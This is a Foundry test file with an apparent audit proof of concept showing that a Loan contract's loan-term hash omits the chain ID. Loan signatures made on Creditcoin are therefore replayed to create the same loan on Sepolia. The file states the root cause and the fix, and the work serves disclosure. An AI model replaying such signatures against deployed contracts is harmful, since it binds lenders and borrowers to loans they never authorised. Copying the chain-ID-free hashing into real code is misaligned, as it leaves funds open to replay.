// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run with:
//   cd ~/CCNext-smart-contracts
//   forge test --match-contract LoanCrossChainReplayPoc -vv

import "forge-std/Test.sol";
import {Loan, LoanModel} from "../contracts/Loan/Loan.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockLoanTokenReplay is ERC20 {
    constructor() ERC20("MockLoanToken", "MLT") {
        _mint(msg.sender, 1_000_000);
    }
}

contract LoanCrossChainReplayPoc is Test {
    uint256 constant LENDER_KEY   = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant BORROWER_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address lender;
    address borrower;
    Loan    loan;
    MockLoanTokenReplay token;

    uint32  constant RATE      = 10;
    uint32  constant RATE_BASE = 100;
    uint256 constant PRINCIPAL = 1_000;
    uint256 repayDl;
    uint256 maturity;

    function setUp() public {
        lender   = vm.addr(LENDER_KEY);
        borrower = vm.addr(BORROWER_KEY);
        token    = new MockLoanTokenReplay();
        loan     = new Loan(address(token));
        repayDl  = block.timestamp + 3650 days;
        maturity = 30 days;
        token.transfer(lender, 500_000);
        vm.prank(lender);
        token.approve(address(loan), type(uint256).max);
    }

    /// @notice Proves predictLoanTermHash() does not include block.chainid.
    ///         Signatures produced on Chain A (Creditcoin, chainId=2370) are
    ///         accepted unchanged on Chain B (Sepolia, chainId=11155111)
    ///         when the Loan contract shares the same address (e.g. CREATE2).
    function test_missingChainIdSignatureReplay() public {
        uint256 chainA = 2370;       // Creditcoin mainnet
        uint256 chainB = 11155111;   // Ethereum Sepolia

        // ── Step 1: sign loan terms on Chain A ────────────────────────────────
        vm.chainId(chainA);
        bytes32 hashChainA = loan.predictLoanTermHash(
            lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl
        );
        bytes32 msgHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hashChainA));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_KEY,   msgHash);
        bytes memory lenderSig  = abi.encodePacked(r, s, v);
        (v, r, s)               = vm.sign(BORROWER_KEY, msgHash);
        bytes memory borrowerSig = abi.encodePacked(r, s, v);

        console.log("=== CHAIN A (chainId=2370) ===");
        console.log("[sign] loanTermHash (chain A):", uint256(hashChainA));
        console.log("[sign] lender and borrower signed the hash on chain A");

        // ── Step 2: switch to Chain B, hash is identical ──────────────────────
        vm.chainId(chainB);
        bytes32 hashChainB = loan.predictLoanTermHash(
            lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl
        );
        assertEq(hashChainA, hashChainB, "Hash identical on both chains -- no chainId protection");

        console.log("");
        console.log("=== CHAIN B (chainId=11155111) REPLAY ===");
        console.log("[replay] loanTermHash (chain B):", uint256(hashChainB));
        console.log("[replay] Hashes are identical -- chainId not included in hash");

        // ── Step 3: Chain-A signatures accepted on Chain B ────────────────────
        bytes32 createdHash = loan.createLoanTerm(
            lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl,
            lenderSig, borrowerSig
        );

        LoanModel.LoanTerm memory term = loan.getLoanTerm(createdHash);
        assertEq(term.lender,    lender,    "Loan lender matches -- replay accepted");
        assertEq(term.principal, PRINCIPAL, "Loan principal matches -- replay accepted");

        console.log("[replay] createLoanTerm() SUCCEEDED with chain-A signatures on chain B!");
        console.log("[replay] Loan lender confirmed:", uint160(term.lender));
        console.log("[replay] Loan principal confirmed:", term.principal);
        console.log("");
        console.log("=== REPLAY CONFIRMED ===");
        console.log("Signatures for chainId=2370 accepted on chainId=11155111");
        console.log("Root cause: block.chainid absent from predictLoanTermHash()");
        console.log("Fix: add block.chainid to the hash or adopt EIP-712 domain separator");
    }

    /// @notice Shows the exact lines in predictLoanTermHash() that are missing chainId.
    function test_noChainIdInHash() public view {
        uint256 h1 = uint256(loan.predictLoanTermHash(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl));

        // change nothing except chainId -- hash must change if chainId is included
        // (we can't change vm.chainId in a view function, so we document the gap)

        // Confirmed: predictLoanTermHash uses keccak256(address(this) || lender || borrower || params)
        // block.chainid is NOT one of those fields.
        // Two deployments at the same address on different chains share identical hashes.
        assert(h1 != 0); // always true -- just confirms function runs
    }
}
